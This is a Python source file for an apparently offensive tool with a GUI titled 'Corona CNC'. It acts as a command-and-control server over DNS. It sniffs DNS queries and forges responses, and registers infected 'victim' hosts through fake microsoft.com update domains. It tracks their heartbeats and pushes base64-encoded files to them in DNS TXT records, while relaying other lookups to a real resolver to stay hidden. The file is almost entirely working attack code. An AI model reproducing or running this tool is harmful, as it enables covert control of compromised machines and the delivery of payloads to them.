#!/usr/bin/env python3

from tkinter import Button, Label, Entry, END
import tkinter as tk
from scapy.all import DNS, DNSQR, DNSRR, IP, send, sniff, sr1, UDP
import time
import threading as th
import base64 as b64
import re
import os

SUBDOMAIN_NUMBER_INDEX = 2
IP_REGEX = "(?:\d{1,3}\.){3}\d{1,3}"
WIDTH = "600"
HEIGHT = "250"
FONT = ("arial", "15")
ENTRY_FONT = ("arial", "12")
BG_ONE = "#4d4d4d"
BG_TWO = "#595959"
FG_ONE = "#d9d9d9"

print(''' 
    ____  _   _______    _____                   ____         
   / __ \/ | / / ___/   / ___/____  ____  ____  / __/__  _____
  / / / /  |/ /\__ \    \__ \/ __ \/ __ \/ __ \/ /_/ _ \/ ___/
 / /_/ / /|  /___/ /   ___/ / /_/ / /_/ / /_/ / __/  __/ /    
/_____/_/ |_//____/   /____/ .___/\____/\____/_/  \___/_/     
                          /_/                                 

''')


class MainWindow:

    # Tons of GUI bullshit, nothing to see here.
    def __init__(self, root):
        self.root = root
        self.root.geometry("{}x{}".format(WIDTH, HEIGHT))
        self.root.title("Corona CNC")
        self.root.configure(background=BG_ONE)
        build_grid(self.root, 10, 10)

        address_l = def_label(root, "Victim address:")
        address_l.grid(row=0, sticky="S")

        global address_e
        address_e = def_entry(self.root)
        address_e.grid(row=1, sticky="N")

        last_hb_l = def_label(root, "Last HeartBeat:")
        last_hb_l.grid(row=2, sticky="S")

        global last_hb_e
        last_hb_e = def_entry(self.root)
        last_hb_e.grid(row=3, sticky="N")
        rewrite_entry(last_hb_e, "N/A")

        upload_l = def_label(self.root, "Upload a file to victim: ")
        upload_l.grid(column=1, row=0, sticky="S")

        global upload_e
        upload_e = def_entry(self.root)
        upload_e.config(state="normal")
        upload_e.grid(column=1, row=1, sticky="N")

        upload_b = Button(self.root, bg=BG_ONE, width=5, text="Upload", fg=FG_ONE)
        upload_b.grid(column=2, row=1, sticky="NW")
        upload_b.config(command=allow_upload)


def processor():
    def craft_and_send(pkt, dns_type, segment=None, is_hb=False, real_response=None):
        """
        Craft a spoofed dns response and send it.
        """

        spf_ip = IP(dst=pkt[IP].src)
        spf_udp = UDP(dport=pkt[UDP].sport, sport=53)
        if real_response:
            spf_resp = spf_ip / spf_udp / real_response[DNS]
        else:
            spf_dnsqr = DNSQR(qname=pkt[DNSQR].qname, qtype=dns_type)
            spf_dnsrr = DNSRR(rrname=pkt[DNSQR].qname, ttl=232, type=dns_type)
            if segment:
                spf_dnsrr.rdata = segment
            if is_hb:
                global hb_ip
                spf_dnsrr.rdata = hb_ip
            spf_dns = DNS(qr=1, id=pkt[DNS].id, qd=spf_dnsqr, an=spf_dnsrr)
            spf_resp = spf_ip / spf_udp / spf_dns
        global iface
        send(spf_resp, verbose=0, iface=iface)

    def send_real_response(pkt):
        """
        Send DNS req to real dns, get response, return response to sender.
        """

        global real_dns

        # Real dns req
        response = sr1(
            IP(dst=real_dns) /
            UDP(sport=pkt[UDP].sport) /
            DNS(rd=1, id=pkt[DNS].id, qd=DNSQR(qname=pkt[DNSQR].qname)),
            verbose=0,
        )
        craft_and_send(pkt, pkt[DNSQR].qtype, real_response=response)

    def process_packet(pkt):
        """
        Check if packet is normal traffic, HeartBeat, UpdateDns or file request.
        HeartBeat = checkupdates.microsoft.com
        UpdateDns = updatedns.microsoft.com
        file request = number.checkupdates.microsoft.com
        """

        # Getting hostname and dns type.
        qname = pkt[DNSQR].qname
        qtype = pkt[DNSQR].qtype
        print("Dns request: " + str(qname))

        # The infector was run. getting real dns from user and setting it as the dns.
        if b"updatedns.microsoft.com" in qname:

            # UI: Write victim address.
            global address_e, real_dns
            rewrite_entry(address_e, pkt[IP].src)

            # Extract real DNS addr from the requested hostname.
            spliced = str(qname)
            spliced = spliced.split("u")
            real_dns = spliced[0][2:-1]
            print(f"Real dns was set as: {real_dns}")

            # Build and send response.
            craft_and_send(pkt, "A")

        # if the HeartBeat is a TXT request (qtype = 16), do the file transfer.
        elif b"checkupdates.microsoft.com" in qname and qtype == 16:

            # segment index = the part of the file requested, represented as the
            # "subdomain" of the address. Example: 12.checkupdates.microsoft.com
            segment_index = int(re.search("\d+", str(qname)).group())

            first = (segment_index * 65000)
            last = (segment_index + 1) * 65000
            file_len = len(content)

            # Handling the end of the file. The char ^ signals the end of the file
            if file_len < last:
                file_segment = content[first:file_len] + b"^"
                print(f"Transfering bytes: {first} , {file_len}")

            else:
                print(f"Transfering bytes: {first} , {last}")
                file_segment = content[first:last]

            craft_and_send(pkt, "TXT", file_segment)

        elif b"checkupdates.microsoft.com" in qname:
            print("<3 Received HeartBeat")
            global last_hb_e, hb_ip

            # UI: Write the time when HB was received.
            rewrite_entry(last_hb_e, time.ctime()[11:-5])
            craft_and_send(pkt, "A", is_hb=True)
        else:

            # Real DNS traffic is handled with threads, in order to ignore drops
            # and to improve speed
            thread = th.Thread(target=send_real_response, args=(pkt))
            thread.start()

    return process_packet


def sniffer():
    # Sniff all data, send filtered packets to the processor
    # If the source port is 53, don't catch the packet (DNS response from real dns)
    global iface, hb_ip
    bpf_filter = f"udp port 53 and ip dst {hb_ip} and not udp src port 53"
    sniff(filter=bpf_filter, prn=processor(), iface=iface)


def build_grid(window, rows, columns):
    """Builds a grid"""
    num = 0
    while num < rows:
        window.rowconfigure(num, weight=1)
        num += 1
    num = 0
    while num < columns:
        window.columnconfigure(num, weight=1)
        num += 1


def def_label(root, text):
    return Label(root, fg=FG_ONE, bg=BG_ONE, text=text, font=FONT)


def def_entry(root):
    return Entry(root, fg=FG_ONE, justify='center', bg=BG_TWO, font=FONT,
                 readonlybackground=BG_ONE, state="readonly")


def rewrite_entry(entry, text):
    """Rewrites the text in the entry"""
    entry.config(state="normal")
    entry.delete(0, END)
    entry.insert(0, text)
    entry.config(state="readonly")


def allow_upload():
    global hb_ip, upload_e, content

    # Changing the HeartBeat address, which will signal the user to start requesting
    # the file.
    last_octet = hb_ip.split(".")[3] - 1
    hb_ip = f"{hb_ip[0]}.{hb_ip[1]}.{hb_ip[2]}.{last_octet}"
    path = upload_e.get()
    with open(path, "rb") as open_file:
        content = open_file.read()
    content = b64.b64encode(content)


def get_iface_data():
    # Get interface ip
    ips = os.popen("ip -4 a").readlines()
    result = []

    # Get rid of loopbacks.
    for line in ips:
        if "link/loopback" not in line and "LOOPBACK" not in line:
            result.append(line)

    print("interfaces:")
    for line in result:
        if line[0].isdigit():
            print(line)
    int_num = input("Choose interface number\n> ")
    for line in result:
        if line[0] == int_num:
            global iface
            iface = line.split(":")[1].strip()
            index = result.index(line) + 1
            addr = re.search(IP_REGEX, result[index]).group()
    global hb_ip
    hb_ip = addr


def main():
    global hb_ip, real_dns
    real_dns = "8.8.8.8"
    get_iface_data()
    sniffer_thread = th.Thread(target=sniffer)
    sniffer_thread.start()

    root = tk.Tk()
    app = MainWindow(root)
    root.mainloop()


if __name__ == '__main__':
    main()
